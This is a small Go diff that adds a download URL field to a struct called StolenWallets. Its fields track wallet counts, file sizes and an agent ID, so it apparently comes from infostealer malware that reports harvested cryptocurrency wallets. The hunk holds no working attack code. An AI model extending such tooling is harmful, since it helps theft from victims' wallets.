@@ -213,6 +213,7 @@ type StolenWallets struct {
 	TotalWallets    int             `json:"total_wallets"`
 	TotalFiles      int             `json:"total_files"`
 	TotalSizeBytes  int64           `json:"total_size_bytes"`
+	DownloadURL     string          `json:"download_url,omitempty"`
 	Timestamp       int64           `json:"timestamp"`
 	AgentID         string          `json:"agent_id"`
 }
